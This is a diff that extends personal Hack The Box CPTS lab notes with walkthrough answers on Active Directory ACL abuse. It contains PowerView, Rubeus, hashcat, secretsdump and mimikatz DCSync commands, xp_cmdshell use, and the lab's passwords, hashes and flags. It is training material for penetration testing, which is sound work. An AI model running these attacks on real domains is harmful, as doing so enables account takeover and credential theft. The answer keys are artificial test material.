@@ -8,6 +8,8 @@ tags:
   - CPTS
   - labs
 ---
+# CPTS labs
+
 ## [Getting Started](https://academy.hackthebox.com/module/details/77)
 
 ### Pentesting Basics
@@ -3615,11 +3617,151 @@ What privileges does the user damundsen have over the Help Desk Level 1 group?
 
 ```
 $sid2 = Convert-NameToSid damundsen
-Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+Get-DomainObjectACL -Identity "Help Desk Level 1" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
+```
+This can also be done with other tools such as Bloodhound, installed under C:\Tools.
+Results: GenericWrite
+
+
+**Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).**
+
+```
+$sid = Convert-NameToSid forend
+
+Get-DomainObjectACL -Identity "dpayne" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
+```
+This can also be done with other tools such as Bloodhound, installed under C:\Tools.
+Results: GenericAll
+
+
+
+**What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)**
+
+```
+$sid = Convert-NameToSid forend
+
+Get-DomainObjectACL -Identity "GPO Management" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
+```
+
+Results: Self-Membership
+
+
+**Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.**
+
+
+![](img/dacl01.png)
+
+
+```powershell
+##########
+# 1. Abuse ForceChangePassword: take over account damundsen
+#########
+
+# Wley will change the password of damundsen. First, open Powershell as Wley
+# Creating a PSCredential Object
+$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+
+![](img/dacl.png)
+
+Our user damundsen has GenericWrite privileges over the `Help Desk Level 1` group. This means, among other things, that the attacker can add a user/group/computer to a group.
+
+```powershell
+##########
+# 2. Abuse GenericWrite: add damundsen to group 'Help Desk Level 1'
+#########
+# Open powershell as damundsen
+# Creating a SecureString Object using damundsen
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+
+# Add damundsen to the group
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+	
+# Confirming damundsen was Added to the Group
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+
+##########
+# 3. Abuse GenericAll: Perform a kerberoasting attack
+#########
+# Members of the `Information Technology` group have `GenericAll` rights over the user `adunn`, which means we could perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak
+# Open powershell as damundsen
+# Creating a SecureString Object using damundsen
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+
+# Creating a Fake SPN
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+#  Kerberoasting with Rubeus
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+# Crack it
+hashcat -m 13100 $filename /usr/share/wordlists/rockyou.txt
+```
+
+Results: SyncMaster757
+
+**Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.**
+
+```
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+```
+Results: syncron
+
+**What is this user's cleartext password?**
+Results: Mycleart3xtP@ss!
+
+ **Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.**
+
+```
+# Open cmd 
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+# When prompted, enter password 'SyncMaster757'
+
+cd C:\Tools\mimikatz\x64
+.\mimikatz.exe
+
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\khartsfield
+```
+
+Results: 4bb3b317845f0954200a6b0acc9b9f9a
+
+
+### Stacking The Deck
+
+**RDP to 10.129.230.228 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". What other user in the domain has CanPSRemote rights to a host?**
+
+```cypher
+# Open Bloodhound
+# In Analysis tab, create a custom query and call it "Find WinRM users":
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+Results: bdavis
+
+
+**What host can this user access via WinRM? (just the computer name)**
+Results: ACADEMY-EA-DC01
+
+
+
+**Authenticate to ACADEMY-EA-DB01 with user "damundsen" and password "SQL1234!". Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.**
+
+```powershell
+ssh htb-student@172.16.5.225
+ 
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
+enable_xp_cmdshell
+xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
 
 ```
 
-Results:
+Results: 1m_the_sQl_@dm1n_n0w!
 
 
 Question
@@ -3630,25 +3772,6 @@ Question
 
 Results:
 
-
-
-Question
-
-```
-
-```
-
-Results:
-
-
-
-Question
-
-```
-
-```
-
-Results:
 
 
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
